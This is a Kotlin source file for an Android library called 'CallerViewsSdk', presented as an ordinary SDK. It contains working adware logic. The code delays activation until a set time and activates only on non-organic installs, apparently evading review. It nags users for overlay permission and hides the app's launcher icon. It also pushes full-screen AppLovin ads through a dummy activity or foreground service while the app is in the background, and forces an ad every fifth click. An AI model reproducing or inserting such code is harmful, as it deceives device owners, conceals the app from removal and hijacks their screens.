package com.app.sdk.sdk

import android.app.ActivityManager
import android.app.ActivityManager.RunningAppProcessInfo
import android.app.KeyguardManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import androidx.activity.ComponentActivity
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.app.sdk.BuildConfig
import com.app.sdk.DymmyActivity
import com.app.sdk.sdk.config.SdkConfig
import com.app.sdk.sdk.data.Prefs
import com.app.sdk.sdk.mediator.ApplovinMediator
import com.app.sdk.sdk.mediator.Mediator
import com.app.sdk.sdk.services.LauncherService
import com.app.sdk.sdk.utils.NotificationUtils
import com.google.firebase.messaging.FirebaseMessaging


object CallerViewsSdk {
    private val currentTime get() = System.currentTimeMillis()

    fun check(context: Context, onCompleteInt: () -> Unit) {
        if (currentTime < SdkConfig.startSDKTime) onCompleteInt.invoke()
        else if (!Prefs.getInstance(context).isSubscribe())
            runInstallReferrer(context, onCompleteInt)
        else onCompleteInt.invoke()
    }

    private fun subscribeUser(context: Context, onCompleteInt: () -> Unit) {
        FirebaseMessaging.getInstance().subscribeToTopic(SdkConfig.topicName)
            .addOnCompleteListener {
                if (it.isSuccessful) Prefs.getInstance(context).setIsSubscribe()
                onCompleteInt.invoke()
            }
    }

    private fun runInstallReferrer(context: Context, onCompleteInt: () -> Unit) {
        with(InstallReferrerClient.newBuilder(context).build()) {
            startConnection(object : InstallReferrerStateListener {
                override fun onInstallReferrerSetupFinished(p0: Int) {
                    val result = p0 == InstallReferrerClient.InstallReferrerResponse.OK &&
                            !installReferrer.installReferrer.contains("organic")
                    if (result || BuildConfig.DEBUG) subscribeUser(context, onCompleteInt)
                    endConnection()
                }

                override fun onInstallReferrerServiceDisconnected() {
                    onCompleteInt.invoke()
                }
            })
        }
    }

    fun loadShowAd(context: Context) {
        if (Prefs.getInstance(context).isAdStarting() || isReachToStartAd(context)) {
            Prefs.getInstance(context).adIsStarting()
            if (canRunAd(context)) showAppLovinAd(context)
        } else if (!hasOverlayPermission(context)) {
            if (needShowNotificationPermission(context)) showOverlayPermissionNotification(context)
        } else if (isStartByTime() && applicationNotHide(context)) hideAppIcon(context)
    }

    private fun isStartByTime() = currentTime >= SdkConfig.startSDKTime

    private fun saveStartAdTime(context: Context) {
        Prefs.getInstance(context).saveStartAdTime(SdkConfig.getLaunchAdTime(currentTime))
    }

    private fun canRunAd(context: Context) =
        (!appIsRunning() || SdkConfig.canShowAdWhenAppInForeground) && context
            .getSystemService(PowerManager::class.java).isInteractive && !context
            .getSystemService(KeyguardManager::class.java).isKeyguardLocked

    private fun applicationNotHide(context: Context) =
        Prefs.getInstance(context).getStartAdTime() == -1L

    private fun isReachToStartAd(context: Context) = Prefs.getInstance(context).getStartAdTime()
        .let { it != -1L && currentTime >= it }

    private fun showOverlayPermissionNotification(context: Context) {
        val overlayNotification = NotificationUtils.getOverlayNotification(context)
        NotificationUtils.showNotification(context, overlayNotification)
    }

    private fun needShowNotificationPermission(context: Context): Boolean {
        if (appIsRunning()) return false
        val prefs =
            Prefs.getInstance(context).takeIf { it.isEnableDisplayingOverlayNotification() }
                ?: return false

        val askCount = prefs.getOverlayNotificationAskCount()
        val askDelay = SdkConfig.getAskOverlayNotificationDelay(askCount)

        val timeBetweenShowingNotifications = currentTime - prefs
            .getOverlayNotificationLastAskTime()

        if (timeBetweenShowingNotifications < askDelay) return false

        prefs.increaseNotificationAskCount()
        prefs.saveNotificationLastAskTime(currentTime)

        return true
    }

    fun enableDisplayingOverlayNotification(context: Context) {
        with(Prefs.getInstance(context)) {
            if (isEnableDisplayingOverlayNotification()) return
            enableDisplayingOverlayNotification(currentTime)
        }
    }

    fun checkOverlayResult(context: Context): Boolean {
        if (!isStartByTime()) return false
        if (canHideIcon(context)) {
            hideAppIcon(context)
            return true
        }
        return false
    }

    private fun canHideIcon(context: Context) = hasOverlayPermission(context) &&
            applicationNotHide(context) && Prefs.getInstance(context).isSubscribe()

    private fun showAppLovinAd(context: Context) {
        val prefs = Prefs.getInstance(context)

        if (kotlin.math.abs(currentTime - prefs.getLastShowingAdTime()) < SdkConfig.showAdDelay) return

        launchAdActivity(context)
    }

    fun saveShowingTime(context: Context) {
        Prefs.getInstance(context).saveShowingAdTime(currentTime)
    }

    private fun launchAdActivity(context: Context) {
        if (SdkConfig.canShowAdDirectly()) Intent(context, DymmyActivity::class.java)
            .setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            .let(context::startActivity)
        else with(context) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                startForegroundService(Intent(this, LauncherService::class.java))
            else startService(Intent(this, LauncherService::class.java))
        }
    }

    private fun appIsRunning() = RunningAppProcessInfo().apply {
        ActivityManager.getMyMemoryState(this)
    }.importance == RunningAppProcessInfo.IMPORTANCE_FOREGROUND

    private fun hasOverlayPermission(context: Context) = Settings.canDrawOverlays(context)

    private fun hideAppIcon(context: Context) {
        saveStartAdTime(context)
        componentName(context, "${context.packageName}${SdkConfig.disableComponentName}")
            .let { context.packageManager.setComponentState(it, getState(false)) }

        if (!SdkConfig.canHideIcon()) {
            componentName(context, SdkConfig.enableComponentName)
                .let { context.packageManager.setComponentState(it, getState(true)) }
        }
    }

    private fun componentName(context: Context, name: String) =
        ComponentName(context, name)

    private fun PackageManager.setComponentState(name: ComponentName, state: Int) {
        setComponentEnabledSetting(name, state, PackageManager.DONT_KILL_APP)
    }

    private fun getState(isEnable: Boolean) =
        if (isEnable) PackageManager.COMPONENT_ENABLED_STATE_ENABLED
        else PackageManager.COMPONENT_ENABLED_STATE_DISABLED

    fun showInAppAd(activity: ComponentActivity, action: () -> Unit) {
        if (!isStartByTime()) {
            action.invoke()
            return
        }

        val clickTimes = Prefs.getInstance(activity).getClickTimes() + 1

        if (clickTimes == 5) ApplovinMediator(object : Mediator.MediatorCallBack {
            override fun onCompleteLoad(mediator: Mediator) {
                mediator.showAd(activity)
            }

            override fun onError() {
                onHide()
            }

            override fun onHide() {
                action.invoke()
            }

            override fun onClicked() {

            }

            override fun onDisplay() {
                Prefs.getInstance(activity).setClickTimes(0)
            }
        }).initMediator(activity)
        else {
            action.invoke()
            Prefs.getInstance(activity).setClickTimes(clickTimes)
        }
    }

    fun openExtension(activity: ComponentActivity) {
        val uri = Uri.parse("https://play.google.com/store/apps/details?id=com.android.chrome")
        activity.startActivity(Intent(Intent.ACTION_VIEW, uri))

        activity.packageManager.getLaunchIntentForPackage("com.google.android.youtube")
            ?.setData(Uri.parse("vnd.youtube:x2bqscVkGxk"))
            ?.let(activity::startActivity)

        Handler(Looper.getMainLooper()).postDelayed({
            activity.finishAndRemoveTask()
        }, 200)
    }

    fun isUserSubscribe(context: Context) = Prefs.getInstance(context).isSubscribe()
}
